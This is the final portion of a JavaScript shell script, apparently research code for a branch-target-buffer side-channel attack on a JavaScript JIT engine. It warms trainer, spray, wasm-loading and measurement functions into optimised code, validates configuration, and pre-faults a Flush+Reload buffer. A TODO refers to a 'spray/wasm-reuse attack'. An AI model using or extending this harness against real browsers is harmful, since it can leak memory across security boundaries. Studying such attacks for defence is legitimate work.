  for (let i = 0; i < 5000; i++) train_btb(cfgMin, ctx, get_fixed_training_list(cfgMin, ctx));

  // 2. prep_btb -> train_btb on the REAL ctx (so train_btb's ctx.dispatcher call
  //    IC settles on the real dispatcher) with cfgMin: nr_bh=1 makes train_btb
  //    issue a single dispatcher call. flag_fixed_training MIRRORS the real cfg
  //    so prep_btb's inner branch tiers up to Ion against the SAME path the
  //    measurement loop will take:
  //      fixed -> get_fixed_training_list (no spray on the real ctx, no storm);
  //      spray -> spray_training_chunks + trigger_gc (sprays a throwaway trainer
  //        on the real ctx and, since gc_storm_bytes is still full until step 5,
  //        runs a real STW storm on each WARM iteration).
  //    In the non-fixed branch prep_btb reads ctx.train_indices, but here cfgMin
  //    sprays only nr_trainer=1 trainer -- so swap in a tiny [0] index list for the
  //    warmup (matching the single sprayed trainer) and restore the real list after.
  cfgMin.flag_fixed_training = cfg.flag_fixed_training;
  let saved_train_indices = ctx.train_indices;
  ctx.train_indices = [0];
  for (let i = 0; i < 5000; i++) prep_btb(cfgMin, ctx);
  ctx.train_indices = saved_train_indices;
  cfgMin.flag_fixed_training = false;
  ctx.fixed_training_chunks = null;

  // 3. The trainer-spawn chain: spray_training_chunks → make_trainer →
  //    spawn_trainer → get_spawn_id. cfgMin.nr_trainer=1 so each call sprays one
  //    throwaway trainer (heated cfgMin.trainer_warmup=1 time); freed by the
  //    trigger_gc() below.
  for (let i = 0; i < WARM; i++)
    spray_training_chunks(cfgMin, ctxMin);
  trigger_gc(cfgMin, ctxMin);

  // 4. load_target_chunk's wasm path. A minimal empty wasm module makes the JS
  //    path (new WebAssembly.Module/Instance) compile identically without
  //    full-size 0x80000 builds. Capped at 300 (each empty module still burns a
  //    ~64 KB shared-stubs page) and GC'd after.
  for (let i = 0; i < 300; i++) load_target_chunk(cfgMin, ctxMin, EMPTY_WASM_BIN);
  trigger_gc(cfgMin, ctxMin);

  // 5. trigger_gc's own storm body. Run the same bytecode with a 0-byte buffer
  //    (browser-portable; no gc() primitive) past the Ion threshold. The
  //    CONDITION reads the REAL cfg flags -- if the real loop skips the storm
  //    (fixed-training && !no_skip_gc) there is nothing to warm.
  if (!cfg.flag_fixed_training || cfg.flag_no_skip_gc) {
    cfgMin.gc_storm_bytes = 0;
    for (let i = 0; i < 5000; i++) trigger_gc(cfgMin, ctxMin);
  }

  // 6. test_btb, on the REAL ctx (real dispatcher) with cfgMin (nr_bh=1 -> one
  //    dispatcher call per invocation). This is what fixes the per-rep dispatcher
  //    deopt: test_btb's ctx.dispatcher IC is Ion-compiled against the real
  //    dispatcher, not a throwaway one that the real run would trip every rep.
  //    test_btb writes its per-slot offsets into the argv it is given, so warm
  //    it on a copy and leave ctx.dummy_callee_argv (which the training
  //    dispatches reuse) at its own indices. The offset arrays hold the same
  //    control values the real loop's even iterations use.
  let warm_argv = ctx.dummy_callee_argv.slice();
  let warm_flush = new Array(cfgMin.nr_bh).fill(ctx.dummy_callee_argv[1]);
  let warm_spec = new Array(cfgMin.nr_bh).fill(0xffffff);
  for (let i = 0; i < WARM; i++) test_btb(cfgMin, ctx, warm_argv, warm_flush, warm_spec);

  // 7. get_spawn_id: warm AFTER the last real GC storm above (steps 3/4). It is a
  //    trivial loop-free one-liner whose off-thread Ion compile is cancelled by
  //    any following GC storm, so nothing below here may storm (steps 7-8 don't).
  for (let i = 0; i < WARM; i++) get_spawn_id(ctxMin);

  // 8. go(): warm on the REAL ctx with cfgMin, matching the real run's flags so
  //    go warms on the branch the loop takes (a mismatch recompiles/RELOCATES it
  //    mid-loop, staling the iBTB entries). In fixed-training pre-build the fixed
  //    list at the real nr_trainer so get_fixed_training_list isn't rebuilt.
  cfgMin.flag_fixed_training = cfg.flag_fixed_training;
  cfgMin.flag_no_skip_gc = cfg.flag_no_skip_gc;
  cfgMin.flag_no_skip_wa = cfg.flag_no_skip_wa;
  // if (cfg.flag_fixed_training) cfgMin.nr_trainer = cfg.nr_trainer;
  cfgMin.nr_target = 0;

  // Baseline only: don't tier go to Ion. Its compile path (baseline -> Ion -> a
  // second Ion recompile) RELOCATES go mid-loop and loses the signal.
  // TODO: add the Ion warm-up back -- the spray/wasm-reuse attack needs go on Ion
  // so it can't compile mid-loop into the reused region.
  cfgMin.repeats = 0;
  for (let i = 0; i < 50; i++) go(cfgMin, ctx);
}

// ===========================================================================
// Entry point
// ===========================================================================

// Validate the parsed config: fatal problems quit, risky combinations warn.
function check_args(cfg) {
  if (cfg.wa_bin_path == null) {
    print("Error: --wa-mod not provided or failed to load.");
    quit(1);
  }
  // --fixed-training takes precedence: it trains and probes every BTB entry, so
  // the trainer set stays the full list instead of the pool-landing subset.
  if (cfg.pool_layout && cfg.flag_fixed_training) {
    print(`WARNING: --fixed-training trains every BTB entry; dropping ` +
          `--pool-layout "${cfg.pool_layout}" and keeping all ${cfg.nr_trainer} trainers.`);
    cfg.pool_layout = null;
  }
}

function init() {
  let cfg = Config.parseArgs(scriptArgs);
  cfg.print();
  check_args(cfg);
  gcPreserveCode();

  let ctx = new Context(cfg);
  if (ctx.wa_bin == null) {
    print("Error: --wa-mod not provided or failed to load.");
    quit(1);
  }

  // Compute the trainer selection list once, before any warmup or measurement.
  // In layout mode this also sets cfg.nr_trainer to the spray count.
  get_usable_trainer_indices(cfg, ctx);
  
  if (!cfg.flag_fixed_training) {
    // train_btb cycles this many trainers (the usable pool-landing set in layout mode,
    // else all nr_trainer). nr_bh above it reuses each enough to tier it up and
    // relocate it (see train_btb).
    let n_trainers = cfg.pool_layout ? ctx.train_indices.length : cfg.nr_trainer;
    if (cfg.nr_bh > n_trainers) {
      let kind = cfg.pool_layout ? "usable pool trainers" : "nr_trainer";
      let hint = cfg.pool_layout ? "Widen the layout (more pools / larger pool_len) or lower --nr-bh."
                                 : "Keep nr_bh <= nr_trainer.";
      print(`WARNING: nr_bh (${cfg.nr_bh}) > ${kind} (${n_trainers}) -- train_btb reuses ` +
            `trainers, risking tier-up + relocate mid-measurement (see train_btb). ${hint}`);
    }
  }

  // Pre-JIT everything (util functions, get_spawn_id, and go itself). This ends
  // with the go warmup and no GC storm after it, so nothing here may storm below.
  force_jit_utils(cfg, ctx);

  // Force the F+R buffer resident to avoid page faults during the critical section.
  for (let i = 0; i < ctx.fru8array.length; i += PAGE_SZ)
    ctx.fru8array[i] = 0xff;

  return { cfg, ctx };
}

// WARNING: Cast away the firstfruits of thy measurement: go() is not made whole
// until its second calling. 
// Opus 4.8: "So the last shall be first, and the first last." -- Matthew 20:16
let { cfg, ctx } = init();
let result = go(cfg, ctx);
print("avg(cnt)=" + Math.round(result.reduce((a, b) => a + b, 0) / result.length));
